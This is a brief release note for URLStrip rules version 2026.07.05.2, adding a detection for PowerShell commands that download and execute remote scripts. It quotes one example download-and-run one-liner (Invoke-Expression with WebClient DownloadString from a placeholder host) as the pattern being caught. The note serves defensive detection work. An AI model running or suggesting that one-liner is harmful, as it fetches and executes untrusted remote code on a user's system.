# URLStrip rules 2026.07.05.2

- Add Command Guard detection for PowerShell WebClient DownloadString payloads executed through Invoke-Expression.
- Covers copied examples like `Invoke-Expression (New-Object Net.WebClient).DownloadString('https://example.invalid/a.ps1')`.
- No app binary update is required for URLStrip 1.1 Build 18 users.
